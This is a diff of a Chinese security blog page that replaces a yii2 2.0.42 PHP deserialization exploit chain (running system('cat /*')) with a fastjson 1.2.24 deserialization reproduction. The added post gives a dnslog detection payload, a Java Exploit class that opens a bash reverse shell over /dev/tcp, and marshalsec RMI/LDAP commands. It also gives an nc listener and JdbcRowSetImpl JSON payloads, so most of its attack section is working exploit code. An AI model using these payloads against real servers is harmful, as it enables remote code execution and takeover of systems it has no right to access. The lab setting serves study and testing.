@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="yii2.0.42反序列化分析, 船到桥头自然直">
+    <meta name="keywords" content="fastjson反序列化复现, 船到桥头自然直">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>yii2.0.42反序列化分析 | 船到桥头自然直</title>
+    <title>fastjson反序列化复现 | 船到桥头自然直</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">yii2.0.42反序列化分析</h1>
+                    <h1 class="description center-align post-title">fastjson反序列化复现</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-08-25
+                    2021-09-13
                 </div>
                 
 
@@ -459,68 +459,83 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h4 id="漏洞链条"><a href="#漏洞链条" class="headerlink" title="漏洞链条"></a><strong>漏洞链条</strong></h4><p><img src="/images/132.png"></p>
-<p><img src="/images/133.png"></p>
-<p><img src="/images/134.png"></p>
-<p><img src="/images/135.png"></p>
-<p><img src="/images/136.png"></p>
+                <ul>
+<li><h5 id="探测是否使用了fastjson"><a href="#探测是否使用了fastjson" class="headerlink" title="探测是否使用了fastjson"></a>探测是否使用了fastjson</h5></li>
+</ul>
+<p>通过报错，因为fastjson会解析json数据，如果传输不完整数据有可能会有报错信息回显，在报文中可能存在fastjson信息。</p>
+<p><img src="/images/137.png"></p>
+<p><u>1.2.24以下版本不会任何信息</u></p>
+<ul>
+<li><h5 id="探测是否存在fastjson漏洞"><a href="#探测是否存在fastjson漏洞" class="headerlink" title="探测是否存在fastjson漏洞"></a>探测是否存在fastjson漏洞</h5></li>
+</ul>
+<p>通过dnslog回显判断</p>
+<p>访问dnslog.cn，点击Get SubDomain生成一个域名</p>
+<p><img src="/images/147.png"></p>
+<p>发送payload</p>
+<pre><code>&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;ffyli6.dnslog.cn&quot;&#125;&#125;</code></pre>
+<p><img src="/images/138.png"></p>
+<p>dnslog有记录则存在fastjson漏洞</p>
+<p><img src="/images/139.png"></p>
+<ul>
+<li><h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5></li>
+</ul>
+<p>版本：1.2.24</p>
+<p>攻击机为192.168.1.100</p>
+<p><strong>借助RMI</strong></p>
 <p>exp</p>
-<pre><code>&lt;?php
-namespace Codeception\Extension&#123;
-    use Faker\DefaultGenerator;
-    use GuzzleHttp\Psr7\AppendStream;
-    class  RunProcess&#123;
-        protected $output;
-        private $processes = [];
-        public function __construct()&#123;
-            $this-&gt;processes[]=new DefaultGenerator(new AppendStream());
-            $this-&gt;output=new DefaultGenerator(&#39;jiang&#39;);
+<pre><code>public class Exploit &#123;
+    public Exploit()&#123;
+        try&#123;
+            Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/192.168.1.100/28888 0&gt;&amp;1&quot;);
+        &#125;catch(Exception e)&#123;
+            e.printStackTrace();
         &#125;
     &#125;
-    echo base64_encode(serialize(new RunProcess()));
-&#125;
-
-namespace Faker&#123;
-    class DefaultGenerator
-&#123;
-    protected $default;
-
-    public function __construct($default = null)
-    &#123;
-        $this-&gt;default = $default;
-&#125;
-&#125;
-&#125;
-namespace GuzzleHttp\Psr7&#123;
-    use Faker\DefaultGenerator;
-    final class AppendStream&#123;
-        private $streams = [];
-        private $seekable = true;
-        public function __construct()&#123;
-            $this-&gt;streams[]=new CachingStream();
-        &#125;
-    &#125;
-    final class CachingStream&#123;
-        private $remoteStream;
-        public function __construct()&#123;
-            $this-&gt;remoteStream=new DefaultGenerator(false);
-            $this-&gt;stream=new  PumpStream();
-        &#125;
-    &#125;
-    final class PumpStream&#123;
-        private $source;
-        private $size=-10;
-        private $buffer;
-        public function __construct()&#123;
-            $this-&gt;buffer=new DefaultGenerator(&#39;j&#39;);
-            include(&quot;closure/autoload.php&quot;);
-            $a = function()&#123;system(&#39;cat /*&#39;);phpinfo();    &#125;;
-            $a = \Opis\Closure\serialize($a);
-            $b = unserialize($a);
-            $this-&gt;source=$b;
-        &#125;
+    public static void main(String[] argv)&#123;
+        Exploit e = new Exploit();
     &#125;
 &#125;</code></pre>
+<pre><code>javac Exploit.java  安装JDK8版本</code></pre>
+<p>编译生成Exploit.class</p>
+<p>在该文件目录启动一个http服务等会加载Exploit.class</p>
+<pre><code>python3 -m http.server 8886</code></pre>
+<p><img src="/images/140.png"></p>
+<p>然后再启动RMI服务监听9998端口</p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://1.15.173.56:8886/#Exploit&quot; 9998</code></pre>
+<p><img src="/images/141.png"></p>
+<p>再监听端口28888</p>
+<pre><code>nc -lvvp 28888</code></pre>
+<p><img src="/images/142.png"></p>
+<p>发送payload反弹shell</p>
+<pre><code>&#123;
+    &quot;b&quot;:&#123;
+        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+        &quot;dataSourceName&quot;:&quot;rmi://192.168.1.100:9998/Exploit&quot;,
+        &quot;autoCommit&quot;:true
+    &#125;
+&#125;</code></pre>
+<p><img src="/images/143.png"></p>
+<p>反弹shell成功</p>
+<p><img src="/images/144.png"></p>
+<p><strong>借助LDAP</strong></p>
+<p>步骤跟上面一样</p>
+<p>payload</p>
+<pre><code>&#123;
+  &quot;name&quot;:&#123;
+    &quot;@type&quot;:&quot;java.lang.Class&quot;,   
+    &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+  &#125;,
+  &quot;x&quot;:&#123;
+    &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,   
+    &quot;dataSourceName&quot;:&quot;ldap://192.168.1.100:9998/Exploit&quot;,   
+    &quot;autoCommit&quot;:true
+  &#125;
+&#125;</code></pre>
+<p><img src="/images/145.png"></p>
+<pre><code>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.1.100:8886/#Exploit 9998</code></pre>
+<p>反弹shell成功</p>
+<p><img src="/images/146.png"></p>
+<p>还有很多其他版本的漏洞，payload类似，只是黑名单不同。</p>
 
             </div>
             <hr/>
@@ -546,7 +561,7 @@ namespace GuzzleHttp\Psr7&#123;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/08/25/yii2-0-42%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">http://example.com/2021/08/25/yii2-0-42%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</a>
+                    <a href="http://example.com/2021/09/13/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">http://example.com/2021/09/13/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -751,9 +766,10 @@ namespace GuzzleHttp\Psr7&#123;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/09/13/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">
                     <div class="card-image">
@@ -771,9 +787,9 @@ namespace GuzzleHttp\Psr7&#123;
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-13
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-13
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -782,6 +798,7 @@ namespace GuzzleHttp\Psr7&#123;
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -792,13 +809,13 @@ namespace GuzzleHttp\Psr7&#123;
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/08/21/disable-function%E7%BB%95%E8%BF%87/">
+                <a href="/2021/08/25/yii2-0-42%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="disable_function绕过">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="yii2.0.42反序列化分析">
                         
-                        <span class="card-title">disable_function绕过</span>
+                        <span class="card-title">yii2.0.42反序列化分析</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -809,7 +826,7 @@ namespace GuzzleHttp\Psr7&#123;
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-08-25
                             </span>
                         <span class="publish-author">
                             
